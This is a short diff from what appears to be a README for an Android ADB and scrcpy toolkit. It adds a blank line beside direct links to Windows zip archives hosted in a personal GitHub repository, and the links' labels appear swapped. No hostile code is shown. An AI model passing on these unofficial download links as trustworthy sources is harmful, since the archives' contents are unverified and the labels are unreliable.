@@ -17,6 +17,7 @@ Direct links:
 SCRCPY: https://github.com/firesab1265-hash/Android-adb-scrcpy-toolkit/raw/main/downloads/platform-tools-win.zip
   
 Toolkit: https://github.com/firesab1265-hash/Android-adb-scrcpy-toolkit/raw/main/downloads/scrcpy-win64-v3.1.zip
+
 ------------------------------
 
 🛠️ 2. INSTALLATION (WINDOWS)
